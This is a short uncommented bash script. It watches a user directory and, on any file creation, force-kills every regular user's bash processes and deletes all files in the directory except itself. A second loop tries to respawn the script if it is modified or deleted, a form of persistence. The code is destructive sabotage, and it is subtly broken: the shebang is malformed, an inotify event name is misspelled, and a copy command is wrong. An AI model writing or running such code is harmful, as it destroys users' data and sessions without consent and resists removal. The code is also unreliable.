#!bin/bash

DIR="/home/ubuntu/Vitor"
SCRIPT_PID=$$
SCRIPT_PATH=$(realpath "$0")

inotifywait -mre create --format '%w%f' "$DIR" | while read NEW_FILE
do
    if [[ "$NEW_FILE" == "$SCRIPT_PATH" ]]; then
        continue
    fi
    
    ps -eo uid,pid,cmd | awk '$1 >= 1000 && /bash/ {print $2}' | grep -v "^$SCRIPT_PID$" | xargs -I {} kill -9 {}
    find "$DIR" -type f ! -path "$SCRIPT_PATH" -exec rm -f {} \;
done &

inotifywait -mre delete_sef,modify "$SCRIPT_PATH" | while read EVENT
do
    cp "$DIR" "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"
    nohup "$SCRIPT_PATH" &
done &